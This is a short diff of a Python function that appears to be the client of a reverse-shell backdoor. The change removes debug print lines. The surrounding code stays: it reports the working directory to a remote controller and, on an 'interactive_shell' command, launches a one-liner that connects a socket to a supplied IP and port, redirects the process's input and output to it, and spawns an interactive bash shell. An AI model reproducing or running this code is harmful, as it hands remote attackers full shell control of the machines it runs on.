@@ -40,9 +40,6 @@ def rvrscnnct(ip,port):
                     aq=os.getcwd()
                     rvrscnct.send(aq.encode('utf-8'))
                 elif "interactive_shell" in command:
-                    print(command)
-                    print(int(command[17:]))
-                    print(ip_candidates)
                     time.sleep(2)
                     os.system("""python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' """.format(ip_candidates,int(command[17:])))
                 else:
